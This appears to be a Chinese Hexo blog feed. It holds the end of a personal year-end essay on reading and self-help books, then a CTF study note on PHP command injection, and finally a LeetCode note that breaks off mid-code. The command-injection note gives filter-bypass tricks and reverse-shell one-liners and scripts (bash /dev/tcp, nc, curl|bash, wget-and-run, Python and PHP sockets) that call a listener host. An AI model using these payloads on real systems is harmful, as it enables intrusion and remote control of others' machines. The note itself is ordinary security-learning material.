<p>这期间也听从方姐的话，多去date，所以在各个社交平台上积极找女生，emm，找了差不多十个女生吧，感觉上一般般，能够交流的东西不多，我也没有什么可交流的。。</p>
<p>之后到现在我感觉都挺平淡的，写需求、建看板、搞数据、玩游戏。</p>
<h1 id="看书与学习"><a href="#看书与学习" class="headerlink" title="看书与学习"></a>看书与学习</h1><p>“买书如山倒，看书如抽丝”，这就是我今年看书的最佳总结。虽然似乎前几年也是这样…</p>
<p>有一件事是我之前一直不太理解的，为什么人们对于自我成长的书籍如此热衷，各种时间规划、做事方法又或是高效交流之类的书籍频繁出现于各类书单中，仿佛不读上几本便代表我对个人的未来毫无打算。不过在读过几本之后，大致是能理解一些了，无他，只因为这些书”好读”。无需复杂的逻辑思考，无需现实中一步步稳扎稳打的项目经验，也无需艰深困苦的理论学习，只用带着幻想就能快速地看完一本书，本质上我认为它们和网络小说并无区别，统称为奶头乐文学。或许更不堪，毕竟网络小说能让人清晰地意识到自己在进行娱乐活动，而这些书籍不会。它在欺骗你，让你以为自己在进行严肃的专业性训练。</p>
<p>在此之前，我一直无法想象几个小时看完一本书是什么概念。我尝试阅读了几本该类型的书，其中不乏被广泛推荐的。而我的结论是：我的厕所读物都不会将其纳入选择范围。电影《后天》中，被困于图书馆中的人们对于应该先烧什么书取暖起了争论，最终的选择是税法典，原因是税法很厚，可以多烧会儿。但我想如果美国的图书馆藏书里有上面的这些书，那想必是一个更好的选择，毕竟这些书和等重量的木头堪称势均力敌。</p>
<p>当然我并不否定所有的自我成长类书籍，但前提是它得是一个专业领域，并且是一个你并不熟悉的专业领域。比如你想创业，那么去看《创业维艰》了解可能遇到的困难，这我认为是有价值的。但如果随便一个与你专业领域丝毫不相交的人便能对你在专业领域的思维方式、做事方法起到极大的帮助，在称赞大佬的慧眼洞察一切之前，我认为先质疑下自己是不是大脑空空比较合适。措辞辛辣，我实在是认为时间不应该如此被浪费。</p>
<p>吐完槽再回到正轨说我自己的年终看书总结，今年的阅读范围依旧是延续去年的风格，主要为社科、投资加小说，去年看完王德峰教授的《重读资本论》后，又购入不少温铁军先生的书籍，之前只读过《百年激进》一本，给我留下了极其深刻的印象。有些书读起来会让你无意间忘记成书的年代差，比如《乡土中国》，又比如温铁军先生的国仁文丛便是此类。</p>
<p>为什么看这类书呢，除去自己对扩展知识边界的兴趣之外，其实也是有实际的利益追求的。我希望能学习通过基本面加大趋势的方式去投资赚钱，因此先看一看这类社科的书籍，为自己对于社会构成的理解打下一点基础，如果能起到一些作用是最好的，但即使最终或许并不会起到什么实质性帮助，也起码满足了我的好奇心。</p>
<p>并且我也认为，经济、历史、政治是三位一体的，谈论其中的任意一个都无法脱离另外两者，所以我的书单也主要是围绕着自己的这个理解在构建，或许实际效果和我的理想情况会有些出入，但我想也不至于太大，毕竟从我自己的实际体验出发，这是能说得通的。无论是读《毛泽东选集》还是看《解构现代化》，又或是《乡土中国》，这些书籍中，这三个方向的内容大量的穿插于书中，即使是有些部分并未落于文字，但细究下去依旧可以看到它们的影子。</p>
<p>技术方面，倒是不太好区分，毕竟文章、书籍、白皮书、议题等等类型基本都是混杂着在学习，我也不太能清楚地说出具体看过哪些，因此直接略过，反正我也不想在年终里谈论太多技术。唯一想说的，就是一点自己的感受。计算机的基础学科能力确实在某种程度上影响着上限，我不敢说决定上限，因此采用了这种保守的说法。在云计算的发展中，技术架构在快速地迭代，很多时候我们所定义的“Web”、“二进制”之间的界限已经不再那么清晰，其实这种趋势也早已经出现了。其实对比一下十年前的安全对抗技术与当下的差别，就能发现这个领域是在以一个堪称恐怖的速度在演变，逆水行舟不进则退，用在这里是再合适不过。</p>
<p>所以我也认为单纯地做一个“XXX语言”的安全研究员是没有前途的，也大概率是会被时代抛弃的，这是我自己这几年学习的一些感受。我上大学时流行PHP，当时的CTF比赛中Web方向的题目几乎被PHP语言包揽，然而大三时，NodeJS、Java、Python这些语言已经极其常见了，最近一两年PHP则更是式微。语言只是一种工具，学习语言背后的底层知识我认为才是目的。这段时间南大的《静态程序分析》和CodeQL的火热也一定程度上说明了大家对于这个趋势即使不说是完全洞悉，也必然是有一定感受的。保持学习，继续去学习那些“老掉牙”的知识，这是明年我对自己在专业领域上的一个学习规划。</p>
<p>如果要让我推荐一下今年的除了技术领域的书单，我想会有以下几本。当然，这些书并不一定通篇都是精华，但至少也是有许多可取之处的：</p>
<ul>
<li>《解构现代化：温铁军演讲录》</li>
<li>《居安思危：国家安全与乡村治理》</li>
<li>《去依附：中国化解第一次经济危机的真实经验》</li>
<li>《八次危机：1949-2009中国的真是惊艳》</li>
<li>《世界秩序》</li>
<li>《随机漫步的傻瓜》</li>
<li>《投资第一课》</li>
<li>《中国私募基金经理风云录》</li>
<li>《零度分离》</li>
<li>《禅与摩托车维修艺术》</li>
</ul>
<p>相比于实体书籍，我对除了网络小说外的各种电子书籍的忍耐力极低，大家常用的kindle、微信阅读我曾经硬着头皮读了十来本书，最终还是放弃使用，而就连这十来本书中，一半以上都是科幻类的小说。我还是更喜欢在阅读时手从纸上擦过的磨砂感，这会让我沉浸进去，而电子书籍则没有这种让我沉浸的愉悦。</p>
<p>不过我也不是对于所有的电子内容都如此抗拒，比如论坛类的APP上的讨论我还是能愉快地享受的，这一类的软件以知乎和雪球为代表。</p>
<p>这一类APP的一大缺点就在于，会有过多的“个性推荐”来打乱自己的信息流，尤其是知乎，在其个人推荐页面会迅速关联你曾经浏览的内容，并且推荐的优先度与热度强挂钩，推荐的内容质量一般可以用一塌糊涂来形容。所以使用这一类的APP进行阅读时，尤其要注意构建一个合理的关注列表，通过这些高质量的关注的回答、点赞来组成一个有价值的信息流，因此在构建了一个我认为质量较高的信息流后就彻底放弃了知乎的推荐栏目下的推送内容。</p>
<p>另一缺点也是老生常谈，即APP阅读的碎片化。我个人认为这是这类应用的天生属性，无法阻止。唯一的解决办法就是，提前或同步构建自己在相关领域的体系化知识，将这些碎片化的内容填充至体系化的框架中，否则看的再多也只是镜花水月，到头来仍然一场空。</p>
<p>我也推荐一下我在知乎上关注的几位答主，内容质量是相当优秀的，有些答主可能不再更新了，不过其历史内容堪称牛逼：</p>
<ul>
<li><a class="link"   href="https://www.zhihu.com/people/wang-ke-dan-13" >王克丹<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.zhihu.com/people/divinites" >司马懿<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.zhihu.com/people/wang-jia-48-31" >王家CFA<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.zhihu.com/people/xu-zhe-42" >许哲<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>更多有意思的博主也可以直接看我的知乎关注列表：<a class="link"   href="https://www.zhihu.com/people/meizjm3i%E3%80%82" >https://www.zhihu.com/people/meizjm3i。<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="杂话"><a href="#杂话" class="headerlink" title="杂话"></a>杂话</h1><p>今年愈加佛系，已经极少在群里或者公开网站上与人就相左的见解而争论。绝大部分情况下，人是无法在网络上说服另一个人的，因为大部分人只是想找一个宣泄情绪的垃圾桶，包括我自己。去年我曾说过，人们开始有了自我的阶级认知，我认为这是一件好事，一年过去了，我依旧这样认为。即使会因为认知等问题而发表一些略显幼稚的言论，但无论如何，发声总要好过不发声，思考总要好过不思考。当然，如果能在大量阅读后发表出更有价值的内容是最好的，然而从我的实际观察来看，这难度似乎还是不低的。</p>
<p>我今年在推特上发表过一个内容，也算是我有感而发：</p>
<blockquote>
<p>技术上的水平并不与个人在其他领域的见地挂钩，技术高超不仅不意味着其他方面同样出色，反而可能更烂。尤其涉及经济、政治、历史等看似与我们生活相接近的领域时，此类情况更为严重。许多上述领域中的意见便只是在单纯发泄情感，在以“对人”的思路去看待一个复杂的集合体，自然觉得哪哪儿都不对劲了。</p>
</blockquote>
<p>如果你看到一个人在对某些政策、新闻、经济、历史等领域做出评价时，请一定立即忘记他在专业领域的建树，去想一想他在该专业领域的造诣，然后再去审视他的观点，一定要按顺序来，切记。我已经实践过至少几十次这个流程。严肃地说，这些领域在没有大量的阅读、没有大量的系统性学习前提下发表的评价约等于垃圾。而已经在一个领域形成了巨大优势的人会对自己在其他领域的水平有严重的错估，因此也就格外地喜欢产生垃圾。</p>
<p>所以如果你觉得某个技术大牛发表的一些政治、经济、历史观点看似在胡扯，请不要怀疑自己，因为那大概率就是在胡扯。当然，胡扯总好过不扯，胡扯起码能促进思考，我们还远没有到达“过度思考”的境地。</p>
<p>虽然我年终尤其爱说废话，但我不是一个文艺青年，至少不是传统意义上的喜欢感慨人生艰难、政治动荡的文艺青年。我不喜欢在书籍或者文章中伤春悲秋，也不喜欢用情绪化的文字去表达自己的感受，直来直去，像铁一般的表达，这是我所追求的境界。你在这篇文章中看到的内容都是我改了又改，能够准确表达我的感受与立场的。这样的坏处就是，写一篇文章真的很累，比写一篇技术类的文章累的太多了。</p>
<p>代码是准确的，你看到的一个赋值语句就是赋值语句，永远都是赋值语句，不可能你眨个眼就变成了判断语句。但文字不一样，情随境变，人随时迁，不同的人在不同的时间去看同一段文字都会有不同的感受，要把自己的感受准确传递给其他人是一件十分要求技巧的事。</p>
<p>如鲁迅一般的文豪也逃不过其文章被纳入阅读理解过度解读的境地，更别说我这三瓜两枣了。尽力改改就好，我实在是真的尽力了。我不是文豪，也已尽了力去准确地表达自己，你要怎么随意理解那就是你的事了。如果有人能读完这篇年终后心情激荡而产生一些新的感悟，那当然再好不过了。</p>
<p>写年终总结时，一边写一边将这一年发生的事在脑子中过了一遍，并挑选了一些能说的、值得说的写出来，这对我而言是一个明心见性的过程。这也正是我将今年的题目如此设置的原因，听起来似乎是有些小孩耍大枪的，不过我感觉很能表达自己的感受就也没再做修改。幸好我还年轻，那就争取早点变成“青年耍大枪”吧。</p>
<p>Copyright © 2020 Meizj.</p>
]]></content>
  </entry>
  <entry>
    <title>命令执行-总结1.0</title>
    <url>/2020/04/08/CTFcomig/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%80%BB%E7%BB%931-0/</url>
    <content><![CDATA[<h2 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020.04.08"></a>2020.04.08</h2><p>现在在上马原课。不是很想听，或者说根本不想听。</p>
<p>刚好看到了合天的一个公众号写了命令注入的总结。</p>
<p>我想着，就花点时间写写看√</p>
<p>首先，我想说说命令注入的重要性。</p>
<p>命令注入，很多时候都需要使用到，我做过的题目里好多都是利用命令注入的。</p>
<p>可以说是基础的东西吧！基础很重要。</p>
<p>有一说一其实就那几个函数使用。</p>
<p>首先区分命令注入和远程代码执行</p>
<p>命令注入是调用了系统的命令。</p>
<span id="more"></span>

<p>远程代码执行是利用代码在服务器中执行。但是就我而言，我觉得两者是相关的。</p>
<p><strong>命令执行原理：</strong></p>
<p>  在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p>
<p><strong>代码执行原理：</strong></p>
<p> 调用一些执行系统命令的函数，如PHP中的system、exec、<strong>assert</strong>、shell_exec、passthru、popen、pcntl_exec等。</p>
<p>当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是几个而已。</p>
<p>所以介绍介绍用的最多的函数叭！【干巴得 马原老师太捞了！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151245166.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>看到没！ system会自己显示输出的！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151301430.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>exec函数就不会自动自己显示输出了。需要我们认为调用函数</p>
<p>echo()、var_dump()等等</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151656770.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>下面是一些和上面比更有趣的函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408151819571.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>这个函数是做过一道题目的！所以详细说说这个函数</p>
<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a class="link"   href="https://www.php.net/manual/zh/function.assert-options.php" >assert_options()<i class="fas fa-external-link-alt"></i></a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>
<p><strong>记住！</strong>是当成php代码！不是当成系统命令！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408152108977.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>这个又得说到了正则表达式。它是怎么利用的呢？</p>
<p>emm说实话，我理解的不深，还是不献丑了</p>
<p>大家先知道，存在这个方式的代码执行</p>
<p>参考：<a class="link"   href="https://xz.aliyun.com/t/2557" >https://xz.aliyun.com/t/2557<i class="fas fa-external-link-alt"></i></a></p>
<p>当然还有很多有意思的函数可以进行命令执行。</p>
<p>在我们找到函数后，去利用的时候，经常会对参数进行过滤。</p>
<p>那么我们需要绕过它。【怎么绕过？？…</p>
<p><strong>补充：</strong> 反引号可以进行命令执行</p>
<p>一般来说：绕过方式无非</p>
<p>1、禁用函数</p>
<p>2、过滤字符</p>
<p>禁用函数的我不懂，先放着。</p>
<p>说说过滤字符</p>
<p>过滤了空格:用哪些代替？ 【要耐心，有时候不是都可以成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 &lt;</span><br><span class="line">2、$&#123;IFS&#125;</span><br><span class="line">3、$IFS$9</span><br><span class="line">4、%09</span><br></pre></td></tr></table></figure>

<p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离  –源自合天智汇</p>
<p>过滤了某些截断符号：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ; | (  )  `(反引号)  ||  &amp;&amp; &amp; &#125;  &#123;  %<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<p>利用Base64编码绕过【我暂时还没遇到过</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali: <span class="title">echo</span> &#x27;<span class="title">cat</span>&#x27; | <span class="title">base64</span></span></span><br><span class="line"><span class="function"><span class="title">Y2F0Cg</span>==</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>: <span class="title">echo</span> &#x27;<span class="title">Y2F0Cg</span>==&#x27; | <span class="title">base64</span> -<span class="title">d</span> </span></span><br></pre></td></tr></table></figure>

<p>用单引号绕过特定字符</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408155323372.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>动态调用：</p>
<p>PHP中允许动态调用函数比如说：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fun</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么在我们可以利用多个变量，动态组成字符串绕过过滤√</p>
<p>好了，终于到了我最不会的反弹shell了</p>
<p>这个我服气。老多问题了。但是理清楚一点点了。</p>
<p>周五早上写清楚。</p>
<hr>
<p>首先要搞清楚什么是反弹，为什么要反弹。<br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
<p>那么什么情况下正向连接不太好用了呢？<br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br>2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>此处源自：<a class="link"   href="https://www.zhihu.com/question/24503813/answer/102253018" >https://www.zhihu.com/question/24503813/answer/102253018<i class="fas fa-external-link-alt"></i></a></p>
<p>在CTF中，我们是使目标机访问我们的服务器，然后访问我们预先写好的代码。</p>
<p>这也目标机会反弹自己的shell到我们的服务器了。</p>
<p>典型的是：<a class="link"   href="https://www.gem-love.com/ctf/2097.html#DuangShell" >https://www.gem-love.com/ctf/2097.html#DuangShell<i class="fas fa-external-link-alt"></i></a></p>
<p>下面copy一下一位师傅的博客：<a class="link"   href="https://www.jianshu.com/p/9456473a0a14" >https://www.jianshu.com/p/9456473a0a14<i class="fas fa-external-link-alt"></i></a></p>
<p>最近在做ctf题时碰到一些命令执行题借用命令执行来反弹shell，这里记录一下。</p>
<h2 id="1-bash反弹shell"><a href="#1-bash反弹shell" class="headerlink" title="1.bash反弹shell"></a>1.bash反弹shell</h2><p>个人感觉bash反弹是最简单、也是最常见的一种。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.20.151/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>bash一句话命令详解</strong><br> 以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-4897e8586a1ebeb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/875/format/webp"
                      alt="img"
                ></p>
<p> 其实以上bash反弹一句完整的解读过程就是：</p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。<br> 在反弹shell时要借助netcat工具反弹</p>
<p>Netcat 一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境</p>
<p><strong>开启外网主机监听</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -lvvp 8080</span></span><br><span class="line">listening on [any] <span class="number">8080</span> ...</span><br></pre></td></tr></table></figure>

<p>kali : 192.168.20.151<br> centos：192.168.20.130</p>
<p>先用kali开启监听：<br> 然后centos执行bash一句话。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-8a2be7a5ac2532b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/611/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-f92bef119eba0444.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/612/format/webp"
                      alt="img"
                ></p>
<p>成功反弹。</p>
<h2 id="2-netcat-一句话反弹"><a href="#2-netcat-一句话反弹" class="headerlink" title="2.netcat 一句话反弹"></a>2.netcat 一句话反弹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~  nc 192.168.31.151 7777 -t  /bin/bash</span><br><span class="line"> 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.151）。</span><br></pre></td></tr></table></figure>

<p>先开启监听7777端口。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-26d6a61c8a6bdcaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/551/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-958ec9dabbc930ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/622/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-748a5254be4165ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/569/format/webp"
                      alt="img"
                ></p>
<p>交互式反弹</p>
<h2 id="3-curl反弹shell"><a href="#3-curl反弹shell" class="headerlink" title="3.curl反弹shell"></a>3.curl反弹shell</h2><p>前提要利用bash一句话的情况下使用curl反弹shell</p>
<p>在存在命令执行的服务器上执行<code>curl ip|bash</code>，该ip的index文件上含有bash一句话，就可以反弹shell。</p>
<p>例如在自己的服务器index上写上一句话</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.20.151/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>192.168.20.151就是作为监听端口的服务器用来得到反弹的shell。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-a63c295a1e63aff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/428/format/webp"
                      alt="img"
                ></p>
<p>存在一句话，利用curl反弹。<br> kali开启监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-5eb371df51540d22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/645/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-a850356eb6ed3014.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/668/format/webp"
                      alt="img"
                ></p>
<h2 id="4-wget方式反弹"><a href="#4-wget方式反弹" class="headerlink" title="4.wget方式反弹"></a>4.wget方式反弹</h2><p>利用wget进行下载执行</p>
<blockquote>
<p>wget 192.168.20.130&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</p>
</blockquote>
<p>利用下面贴出的php进行反弹。<br> 开启监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-bf1e2b4edcdf28db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/661/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-885c10d962ca43fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/691/format/webp"
                      alt="img"
                ></p>
<p>成功反弹shell</p>
<h2 id="5-其他脚本反弹"><a href="#5-其他脚本反弹" class="headerlink" title="5.其他脚本反弹"></a>5.其他脚本反弹</h2><h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><p>开启kail监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-ea48849e495003eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-bbcd7bf41dd98e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/665/format/webp"
                      alt="img"
                ></p>
<p>反弹成功。<br> py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.20.151&quot;</span>,<span class="number">7777</span>)) <span class="comment">#更改localhost为自己的外网ip,端口任意</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h3><p>开启kail监听端口，</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-444bfa06b7da605b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674/format/webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://upload-images.jianshu.io/upload_images/9113981-e18a534cd266a1db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/641/format/webp"
                      alt="img"
                ></p>
<p>成功反弹，不过这里要将php保存成txt文件进行反弹，若为php文件不会反弹成功。<br> php脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.20.151&quot;</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的外网ip，端口任意</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反弹shell我大致上了解了。但是很浅薄。</p>
<p>等我又遇到这样的题目再说叭。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>leetcode_01_part</title>
    <url>/2020/04/26/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-01-week/</url>
    <content><![CDATA[<h2 id="2020-04-26"><a href="#2020-04-26" class="headerlink" title="2020.04.26"></a>2020.04.26</h2><h3 id="23-合并K个排序链表"><a href="#23-合并K个排序链表" class="headerlink" title="23. 合并K个排序链表"></a><a class="link"   href="https://leetcode-cn.com/problems/merge-k-sorted-lists/" >23. 合并K个排序链表<i class="fas fa-external-link-alt"></i></a></h3><p>难度困难610</p>
<p>合并 <em>k</em> 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。</p>
<span id="more"></span>

<p><strong>示例:</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  <span class="number">1</span>-&gt;<span class="number">4</span>-&gt;<span class="number">5</span>,</span><br><span class="line">  <span class="number">1</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>,</span><br><span class="line">  <span class="number">2</span>-&gt;<span class="number">6</span></span><br><span class="line">]</span><br><span class="line">输出: <span class="number">1</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>-&gt;<span class="number">4</span>-&gt;<span class="number">5</span>-&gt;<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>正常对两个链表排序</p>
<p>下图是我以前写的<a class="link"   href="https://liduoan.github.io/2020/02/24/ACMcoming/%E7%89%9B%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/" >基本算法训练<i class="fas fa-external-link-alt"></i></a></p>
<p>然后递归就是了，所以最差版本就是下面了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> 